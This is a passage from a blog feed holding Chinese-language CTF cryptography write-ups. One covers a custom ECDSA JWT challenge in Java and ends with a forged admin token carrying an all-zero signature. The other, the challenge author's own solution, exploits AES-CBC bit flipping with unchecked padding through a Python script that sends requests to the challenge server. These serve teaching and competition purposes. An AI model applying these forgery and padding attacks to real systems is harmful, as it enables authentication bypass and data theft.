class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">        header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">        payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">        payload.put(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">        <span class="type">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> parts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> parts[<span class="number">2</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">            <span class="type">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line">            <span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadDecodeString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">        System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ecdsa.keyGen();</span><br><span class="line">        <span class="type">ECPrivateKey</span> <span class="variable">ecPrivateKey</span> <span class="operator">=</span> (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">ECPublicKey</span> <span class="variable">ecPublicKey</span> <span class="operator">=</span> (ECPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">String</span> <span class="variable">menu</span> <span class="operator">=</span> <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            System.out.print(menu);</span><br><span class="line">            choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> generateToken(user, ecPrivateKey);</span><br><span class="line">                System.out.println(token);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> getFlag(token, ecPublicKey, user);</span><br><span class="line">                System.out.println(flag);</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        task();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiV2Fua2tvIFJlZSIsImFkbWluIjp0cnVlLCJleHAiOjE3NTkzMjEzMjg0Mzh9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;ECDSA代表椭圆曲线数字签名算法，与旧的RS</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>GoGoCrypto_writeup</title>
    <link href="http://example.com/2023/12/27/GoGoCrypto-writeup/"/>
    <id>http://example.com/2023/12/27/GoGoCrypto-writeup/</id>
    <published>2023-12-26T16:10:28.000Z</published>
    <updated>2023-12-27T07:39:37.663Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>本人参与极客大挑战2023的出题工作，主要负责密码学板块。</p><p>对于GoGoCrypto这道反响比较高的题目，这里附上题解。</p><p><a href="https://github.com/AL3XEI709/Geek23/blob/main/GoGoCrypto/GoGoCrypto_setup.zip">题目源码</a></p><p>这题用Golang写了一个Flag Folder的交互，流程大概长这样：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270044077.png" alt="image-20231227004357980"></p><p>加解密采用的算法是AES的CBC mod。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270045335.png" alt="image-20231227004502286"></p><p>这种加密算法的主要攻击手段是<strong>字节翻转（bit flipping）</strong>，这种攻击的前提是一个明文分组是已知的。</p><p>sid是16字节，根据填充算法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := aes.BlockSize - (<span class="built_in">len</span>(pt) % aes.BlockSize)</span><br><span class="line">padding := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padlen)&#125;, padlen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(pt, padding...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道填充后有两块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block#1 block#2</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| sid | Padding (&quot;\x10&quot;*16) |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>那么我们就能修改第一个密文分组，来控制解密后的第</p><p>二个明文分组。具体的原理是：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270047773.png" alt="image-20231227004700688"></p><p>这一步显然会破坏第一块的明文，但并不影响我们的利用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unpad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := <span class="type">int</span>(pt[<span class="built_in">len</span>(pt)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">return</span> pt[:<span class="built_in">len</span>(pt)-padlen]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unpad函数只是将padding的最后一个字节作为padding长度，根本不检查，所以我们可以很容易的让padding长度为len(plaintext) - 1，那么我们就可以得到一个只有一个字节的明文了！</p><p>因此攻击流程是：</p><ul><li><p>修改密文并上传</p></li><li><p>服务端解密，得到只有一个字节的明文</p></li><li><p>遍历所有明文（254），必然得到flag。</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec, b64encode <span class="keyword">as</span> enc </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_request</span>(<span class="params">url, method=<span class="string">&#x27;GET&#x27;</span>, headers=<span class="literal">None</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method.upper() == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            response = requests.put(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            response = requests.delete(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unsupported HTTP method&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查请求是否成功</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">url = <span class="string">&#x27;http://47.109.106.62:7842/&#x27;</span> </span><br><span class="line">response = requests.get(url) </span><br><span class="line">x = <span class="built_in">str</span>(response.headers)</span><br><span class="line"></span><br><span class="line">token = unquote(x.split(<span class="string">&quot;token&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line">token = dec(token) </span><br><span class="line">nonce = unquote(x.split(<span class="string">&quot;nonce&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">c1, c2 = token[:<span class="built_in">len</span>(token)//<span class="number">2</span>], token[<span class="built_in">len</span>(token)//<span class="number">2</span>:] </span><br><span class="line">c1 = xor(xor(c1,<span class="string">b&#x27;\x10&#x27;</span>*<span class="number">16</span>),<span class="string">b&#x27;\x1f&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">form_data = &#123;</span><br><span class="line">    <span class="string">&quot;Rec&quot;</span>: enc(c1+c2).decode()</span><br><span class="line">&#125;</span><br><span class="line">res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/dec&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data) </span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: enc(<span class="built_in">chr</span>(i).encode()).decode()+enc(sha512(dec(nonce)).digest()).decode()</span><br><span class="line">    &#125;</span><br><span class="line">    res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/check&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SYC&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">        <span class="built_in">print</span>(res) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment"># &#123;&quot;check&quot;:&quot;true&quot;,&quot;msg&quot;:&quot;Your flag is: SYC&#123;AL3XEI_FAKE_FLAG&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;本人参与极客大挑战2023的出题工作，主要负责密码学板块。&lt;/p&gt;
&lt;p&gt;对于GoGoCrypto这道反响比较高的题目，这里附上题解。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
